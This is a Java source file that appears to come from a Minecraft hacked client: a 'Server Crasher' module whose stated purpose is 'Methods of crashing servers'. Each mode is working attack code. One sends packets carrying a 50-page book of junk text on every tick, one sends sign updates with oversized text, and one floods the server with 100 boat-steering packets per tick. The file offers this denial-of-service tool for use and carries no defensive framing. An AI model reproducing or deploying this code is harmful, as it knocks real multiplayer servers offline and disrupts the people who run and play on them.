package com.backdoored.hacks.exploit;

import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.init.Items;
import com.backdoored.utils.Utils;
import com.backdoored.setting.Setting;
import com.backdoored.gui.CategoriesInit;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.item.ItemStack;
import com.backdoored.hacks.BaseHack;

public class ServerCrasher extends BaseHack
{
    private ItemStack bookObj;
    private String message;
    private String color;
    private ITextComponent line1;
    private ITextComponent line2;
    private ITextComponent line3;
    private ITextComponent line4;
    private ITextComponent[] words;
    
    public ServerCrasher() {
        super("Server Crasher", CategoriesInit.EXPLOIT, "Methods of crashing servers");
        this.bookObj = null;
        this.message = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        this.color = "red";
        this.line1 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line2 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line3 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line4 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.words = new ITextComponent[] { this.line1, this.line2, this.line3, this.line4 };
        new Setting("Mode", this, "book", new String[] { "book", "sign", "new" });
    }
    
    public void onEnabled() {
        Utils.printMessage("Crashing", "red");
        if (this.getSetting("Mode").getValString().equals("book")) {
            this.bookObj = new ItemStack(Items.field_151099_bA);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tag = new NBTTagCompound();
            final String author = ServerCrasher.mc.func_110432_I().func_111285_a();
            final String title = "\n Woops \n";
            final String size = this.message;
            for (int i = 0; i < 50; ++i) {
                final NBTTagString tString = new NBTTagString(size);
                list.func_74742_a((NBTBase)tString);
            }
            tag.func_74778_a("author", author);
            tag.func_74778_a("title", "\n Woops \n");
            tag.func_74782_a("pages", (NBTBase)list);
            this.bookObj.func_77983_a("pages", (NBTBase)list);
            this.bookObj.func_77982_d(tag);
        }
    }
    
    @SubscribeEvent
    public void update(final TickEvent.ClientTickEvent event) {
        if (!this.getEnabled()) {
            return;
        }
        if (ServerCrasher.mc.field_71441_e == null) {
            this.setEnabled(false);
            return;
        }
        try {
            if (this.getSetting("Mode").getValString().equals("book")) {
                ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, this.bookObj, (short)0));
            }
            if (this.getSetting("Mode").getValString().equals("sign")) {
                ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketUpdateSign(ServerCrasher.mc.field_71439_g.func_180425_c(), this.words));
            }
            if (this.getSetting("Mode").getValString().equals("new")) {
                for (int i = 0; i < 100; ++i) {
                    ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketSteerBoat(true, true));
                }
            }
            Thread.sleep(12L);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
